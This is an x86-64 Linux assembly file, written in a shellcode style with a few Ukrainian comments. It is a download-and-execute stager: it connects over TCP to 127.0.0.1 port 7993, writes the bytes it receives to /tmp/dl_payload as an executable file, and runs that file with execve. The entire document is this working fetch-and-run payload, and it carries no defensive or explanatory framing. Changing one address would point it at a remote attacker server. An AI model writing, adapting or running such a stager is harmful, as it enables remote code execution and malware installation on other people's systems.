.intel_syntax noprefix
.section .text
.global _start

_start:
    /* ---- socket(AF_INET, SOCK_STREAM, 0) ---- */
    xor     rax, rax
    mov     al, 41
    xor     rdi, rdi
    mov     dil, 2
    xor     rsi, rsi
    mov     sil, 1
    xor     rdx, rdx
    syscall
    mov     r12, rax

    /* ---- sockaddr_in{ AF_INET, port=7993, addr=127.0.0.1 } ---- */
    xor     rax, rax
    push    rax
    push    rax
    mov     word  ptr [rsp], 0x0002
    mov     word  ptr [rsp+2], 0x391f
    mov     dword ptr [rsp+4], 0x0100007f

    /* ---- connect(sockfd, &addr, 16) ---- */
    xor     rax, rax
    mov     al, 42
    mov     rdi, r12
    mov     rsi, rsp
    xor     rdx, rdx
    mov     dl, 16
    syscall
    add     rsp, 16

    /* ---- open("/tmp/dl_payload", O_WRONLY|O_CREAT|O_TRUNC, 0700) ---- */
    lea     rdi, [rip + path]
    xor     rax, rax
    mov     al, 2
    mov     esi, 0x241
    mov     edx, 0x1c0
    syscall
    mov     r13, rax

    /* ---- read(socket) -> write(file) до кінця даних ---- */
    sub     rsp, 512
read_loop:
    xor     rax, rax
    mov     rdi, r12
    mov     rsi, rsp
    mov     rdx, 512
    syscall
    cmp     rax, 0
    jle     done_reading
    mov     r14, rax
    mov     rax, 1
    mov     rdi, r13
    mov     rsi, rsp
    mov     rdx, r14
    syscall
    jmp     read_loop
done_reading:
    add     rsp, 512

    mov     rax, 3
    mov     rdi, r12
    syscall
    mov     rax, 3
    mov     rdi, r13
    syscall

    /* ---- execve("/tmp/dl_payload", argv, NULL); argv будується на стеку ---- */
    lea     rdi, [rip + path]
    xor     rax, rax
    push    rax
    push    rdi
    mov     rsi, rsp
    xor     rdx, rdx
    xor     rax, rax
    mov     al, 59
    syscall

    mov     rax, 60
    mov     rdi, 1
    syscall

.section .data
path:
    .asciz "/tmp/dl_payload"
